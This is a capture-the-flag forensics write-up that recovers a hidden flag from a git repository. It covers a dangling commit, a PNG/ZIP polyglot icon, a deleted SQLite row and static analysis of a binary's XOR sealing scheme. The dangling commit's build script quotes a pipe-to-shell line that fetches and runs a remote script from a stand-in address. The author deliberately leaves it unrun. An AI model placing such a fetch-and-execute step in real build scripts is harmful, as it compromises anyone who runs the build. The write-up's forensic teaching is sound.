---
tags: [forensics, git, polyglot, sqlite, reverse]
---

🇬🇧 English · [🇫🇷 Français](README.fr.md)

# Polyglot Requiem

| Category | Solves | Solved | First blood | Hint used | Solved by | Challenge author |
|---|---|---|---|---|---|---|
| forensics | 108 | ✅ | — | no | 0xAr3s-root | Mohamed Amine Mzoughi |

## Challenge description

> A review of a ground-station software supply chain turned up altered build history and an odd dashboard asset. The station works for the Operation Dawn coalition, which puts its builds high on the Ash Army's target list.
>
> Recover the concealed marker from the retained repository and submit the complete `CSCTF{...}` value. Inspect build scripts, hooks and recovered programs as data: do not run them, and do not contact addresses found in the evidence. The exercise is constructed and the organizations are fictional. Attachment: `polyglot-requiem.zip`, 39,051 bytes, SHA-256 `2a3aeda4fcc7fab03a268130a22b31b2194ed45f74981146ae765d78c97813c9`.
>
> Flag format: `CSCTF{...}`

**Artifact files:** `files/flight-telemetry-sdk/` (a git repository with its `.git`), `files/README_FOR_RESPONDERS.md`, `files/manifest.sha256` (not committed).

## TL;DR

`assets/telemetry_icon.png` is a PNG/ZIP polyglot: a `tEXt` chunk carries a provenance tag, and the appended ZIP holds a SQLite file with a *deleted* `ci_provenance_seal` row and the sealing tool `assetsignd`; static analysis of that tool gives the scheme (`SHA-256(reverse(tag) ‖ epoch_le64)` repeating-key XOR) and the commit timestamp is the epoch → flag.

## Approach

**1. Recon — a repository with a dangling commit and a suspicious icon**

I worked on a copy of the repository and never ran `build.sh` or any hook. `git log --all` shows five ordinary commits, all with the same timestamp (1792061626). `git fsck --lost-found --unreachable` finds one unreachable commit, `c435f88` "build: add telemetry opt-in check" (it is also in `.git/ORIG_HEAD`): its `build.sh` pipes `curl -s http://198.51.100.9/telemetry-opt-in.sh | sh` — the "altered build history" that was reset away. I did not contact the address; it is a distraction for the marker itself.

The other lead is the icon added in `92d3ba9` and referenced from the README: `assets/telemetry_icon.png` is 23,008 bytes for a 10×10 image. `binwalk` reports a PNG, then a ZIP at 0x72.

**2. Hypothesis — a PNG/ZIP polyglot with a deleted secret**

Walking the PNG chunks by hand: `IHDR`, a `tEXt` chunk `Provenance` = `0f18e37122ddbcca` (8 bytes in hex, the "tag"), a tiny `IDAT`, `IEND`; then 22,894 trailing bytes that start with `PK\x03\x04`. Extracted (stored, no compression), the ZIP has two members:

- `telemetry_cache.db`: SQLite, table `build_secrets` with obviously fake tokens (`AKIADEMOFAKE…`, `npm_fake…`) — decoys;
- `assetsignd`: an ELF whose usage is `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`.

`strings` on the database shows a row that `.dump` does not: `ci_provenance_seal` followed by 36 high-entropy bytes. It was deleted (the cell is still in the page body, unallocated space) so SQLite does not return it. The record header before the label gives the blob length (serial type `0x54` → 36 bytes). Ciphertext, a tag, an epoch and a tool that takes exactly these inputs: the tool seals the data.

**3. Exploitation — reverse the seal statically, then recompute the key**

I did not run `assetsignd`. Disassembling it (`objdump`/`r2`) shows: the SHA-256 round constants inline (no libcrypto import), `strtoull(argv[2])` for the epoch, `sscanf("%02x")` to parse the tag into bytes, **a byte reversal of the tag**, the epoch appended as **8 little-endian bytes**, one SHA-256 over that message, and finally `out[i] = in[i] ^ digest[i & 0x1f]`. So:

```text
key = SHA-256( reverse(tag_bytes) || epoch_le64 );  plain[i] = cipher[i] XOR key[i mod 32]
```

For the epoch the obvious candidate is the repository's own timestamp, 1792061626 (the dated header, the git index and the ZIP entries all match). I first tried the `HMAC-SHA256` variant of a similar tool from another challenge, which gave nothing; I then brute-forced the epoch around the commit time against the known `CSCTF{` prefix (6 key bytes), which immediately confirmed the reversed-tag SHA-256 scheme at exactly 1792061626. Decrypting the 36 bytes gives the flag.

```bash
python3 -I solve/solve.py files/flight-telemetry-sdk
```

Solve script: [`solve/solve.py`](solve/solve.py)

## Flag

`CSCTF{...}` (redacted)

## Reflections

- Tool output hides deleted data: SQLite `.dump` and queries ignore deleted cells, raw `strings`/hex on the file does not.
- An image can carry a whole archive after `IEND`; walking chunks and checking the trailing bytes is faster than trusting the extension.
- A binary documented only by its usage line can be understood statically: constants (SHA-256 K table), loops (byte reversal, 8-byte epoch) and the final XOR were enough, with no need to execute it.
- The known-plaintext prefix `CSCTF{` turns an uncertain parameter (the epoch) into a cheap brute force and validates the whole scheme.
- The dangling commit with `curl | sh` is the scenario's "story", not the marker: noting it and not touching the address is the safe handling.

## Tools & references

- `git` (`log --all`, `fsck --lost-found`, `cat-file`), `binwalk`, `strings`, `objdump`, `radare2`
- Python 3 (`struct`, `zipfile`, `hashlib`)
- PNG chunk structure, ZIP appended data, SQLite record format (serial types)

---
[⬅ Back to event](../../README.md)
